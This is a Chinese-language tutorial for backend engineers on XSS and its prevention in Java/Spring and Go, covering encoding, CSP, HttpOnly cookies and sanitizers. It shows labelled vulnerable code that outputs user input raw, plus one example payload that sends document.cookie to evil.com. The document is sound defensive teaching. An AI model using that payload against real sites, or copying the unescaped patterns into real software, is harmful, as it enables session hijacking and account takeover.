---
title: "Day 02 — XSS（Cross-Site Scripting，跨站腳本攻擊）"
date: 2026-04-22
tags: ["XSS", "前端安全", "OWASP Top 10"]
---

# Day 02 — XSS（Cross-Site Scripting，跨站腳本攻擊）

> 日期：2026-04-22
> 適合對象：後端工程師初學者
> 主題難度：★★☆☆☆（基礎必學）

---

## 一、什麼是 XSS？

XSS（Cross-Site Scripting，跨站腳本攻擊）是指攻擊者**把惡意的 JavaScript（或 HTML）注入到網頁中**，讓「其他使用者的瀏覽器」在不知情的情況下執行這段腳本。

一句話說明：**SQL Injection 騙的是資料庫，XSS 騙的是別人的瀏覽器。**

很多後端工程師會誤以為「XSS 是前端的事」——這是錯的。大部分 XSS 的漏洞源頭，是**後端把使用者輸入直接原樣輸出到 HTML 裡面**。只要後端在回應（response）時不做處理，前端再漂亮也擋不住。

### 常見的 XSS 危害

- 偷走使用者的 Session Cookie → 直接接管帳號
- 偽造頁面內容、釣魚取得密碼或信用卡
- 以受害者身份發送請求（如轉帳、改密碼）
- 散播蠕蟲（社群網站最常見）

---

## 二、XSS 的三種類型

### 1. Stored XSS（儲存型）—— 最危險

惡意腳本被**存進資料庫**，任何瀏覽該頁面的使用者都會中招。
典型情境：留言板、文章內容、使用者暱稱、商品評論。

### 2. Reflected XSS（反射型）

惡意腳本藏在 URL 或表單輸入中，後端把它「反射」回 HTML。
典型情境：搜尋結果頁（`/search?q=...`）、錯誤訊息頁。

### 3. DOM-based XSS（DOM 型）

純前端 JavaScript 操作 DOM 時造成的注入，後端通常不經手。
本篇聚焦在前兩種，因為那是後端該負責的部分。

---

## 三、經典情境：留言板的 Stored XSS

假設有一個留言 API，使用者送出留言後，後端把內容存進 DB，並在頁面列出所有留言。

### 錯誤示範（Java / Spring Boot）

```java
@GetMapping("/comments")
public String listComments(Model model) {
    List<Comment> comments = commentRepository.findAll();
    StringBuilder html = new StringBuilder();
    for (Comment c : comments) {
        // 直接把使用者輸入串進 HTML！
        html.append("<div class='comment'>").append(c.getContent()).append("</div>");
    }
    model.addAttribute("rawHtml", html.toString());
    return "comments"; // Thymeleaf 模板用 th:utext 原樣輸出
}
```

如果攻擊者送出這樣的留言：

```html
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

那麼**每一個打開留言頁的使用者**，瀏覽器都會自動執行這段腳本，Cookie 就被送到攻擊者的伺服器了。

### 錯誤示範（Go / net/http）

```go
func listComments(w http.ResponseWriter, r *http.Request) {
    comments := loadCommentsFromDB()
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    for _, c := range comments {
        // 直接 Fprintf 輸出使用者內容
        fmt.Fprintf(w, "<div class='comment'>%s</div>", c.Content)
    }
}
```

一樣的問題：`c.Content` 若含 `<script>...</script>`，瀏覽器會把它當成真正的腳本執行。

---

## 四、正確防禦方式

防禦 XSS 的核心原則只有一條：

> **「輸出時（Output）要做 encoding，而不是只在輸入時（Input）做 filter。」**

為什麼？因為同一個資料可能被輸出到不同情境（HTML body、HTML attribute、JavaScript、URL），每種情境的「危險字元」不一樣。輸入時你不知道它之後會被怎麼用，所以**輸出時才是正確的防禦點**。

### 防禦 1：HTML Encoding（最基本）

把 `<`、`>`、`"`、`'`、`&` 轉成 HTML entity：

| 原字元 | 轉換後 |
|--------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

#### Java 正確寫法（使用樣板引擎自帶的 escape）

```java
// Thymeleaf：用 th:text（會自動 escape），不要用 th:utext
// <div class='comment' th:text="${comment.content}"></div>
```

若必須自己處理，使用 OWASP Java Encoder：

```java
import org.owasp.encoder.Encode;

String safe = Encode.forHtml(userInput);           // 輸出到 HTML body
String safeAttr = Encode.forHtmlAttribute(input);  // 輸出到 HTML 屬性
String safeJs = Encode.forJavaScript(input);       // 嵌入 <script> 裡
```

> 注意：OWASP Java Encoder（`org.owasp.encoder:encoder`）是長期維護的正式函式庫，建議加進 Maven/Gradle 依賴。

#### Go 正確寫法（使用 html/template）

```go
import "html/template"

var tpl = template.Must(template.New("c").Parse(
    `<div class='comment'>{{.Content}}</div>`,
))

func listComments(w http.ResponseWriter, r *http.Request) {
    comments := loadCommentsFromDB()
    for _, c := range comments {
        tpl.Execute(w, c) // 自動 context-aware escape
    }
}
```

Go 的 `html/template` 是**context-aware**的：它知道 `{{.X}}` 出現在 HTML body、attribute、URL、script 中分別要怎麼 escape。這是 Go 標準庫最棒的設計之一。

⚠️ **千萬不要用 `text/template` 產生 HTML**，那個不會 escape，等於門戶大開。

### 防禦 2：Content Security Policy（CSP）

CSP 是後端回應的 HTTP header，告訴瀏覽器「哪些腳本來源是被允許的」。
這是 XSS 的第二道防線，就算 escape 漏了一個地方，CSP 也可能擋下來。

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

Java Spring Security：

```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives(
        "default-src 'self'; script-src 'self'; object-src 'none'"
    ))
);
```

Go：

```go
w.Header().Set("Content-Security-Policy",
    "default-src 'self'; script-src 'self'; object-src 'none'")
```

### 防禦 3：Cookie 設定 HttpOnly

就算真的被 XSS 了，只要 Session Cookie 有 `HttpOnly` flag，JavaScript 就讀不到 `document.cookie`，攻擊者偷不走最有價值的東西。

```java
// Spring Boot
ResponseCookie cookie = ResponseCookie.from("SESSION", value)
    .httpOnly(true)
    .secure(true)
    .sameSite("Lax")
    .build();
```

```go
http.SetCookie(w, &http.Cookie{
    Name:     "SESSION",
    Value:    value,
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteLaxMode,
})
```

### 防禦 4：需要允許部分 HTML 時，使用 Sanitizer

例如使用者可以貼「富文本留言」（允許 `<b>`、`<i>` 但不允許 `<script>`），這時要用白名單式的 HTML Sanitizer，而不是自己寫 regex。

- Java：**OWASP Java HTML Sanitizer**（`com.googlecode.owasp-java-html-sanitizer:owasp-java-html-sanitizer`）
- Go：**bluemonday**（`github.com/microcosm-cc/bluemonday`）

```go
import "github.com/microcosm-cc/bluemonday"

p := bluemonday.UGCPolicy() // 預設允許部落格常見標籤
safeHTML := p.Sanitize(userInput)
```

---

## 五、後端工程師的 XSS 自我檢查清單

每次寫 API 或 render 頁面，問自己這五個問題：

1. 使用者輸入最後會被放進哪裡？HTML body？Attribute？JS？URL？
2. 我用的模板引擎有自動 escape 嗎？（Thymeleaf `th:text`、Go `html/template`、React JSX 預設都會）
3. 有沒有用到「繞過 escape」的語法？（`th:utext`、`dangerouslySetInnerHTML`、`template.HTML(...)`）—— 這些是紅旗。
4. API 回傳 JSON 時，`Content-Type` 有正確設成 `application/json` 嗎？（瀏覽器 sniff 可能把它當成 HTML 解析）
5. Session Cookie 有沒有設 `HttpOnly`、`Secure`、`SameSite`？

---

## 六、一句話總結

> **「永遠不要信任使用者輸入；永遠在輸出時做 context-aware encoding。」**

明天預告：Day 03 — **CSRF（跨站請求偽造）**，以及為什麼只有 XSS 防禦是不夠的。

---

## 參考資料

- OWASP: [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- OWASP Cheat Sheet: [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- Go [html/template 官方文件](https://pkg.go.dev/html/template)
- [OWASP Java Encoder](https://owasp.org/www-project-java-encoder/)
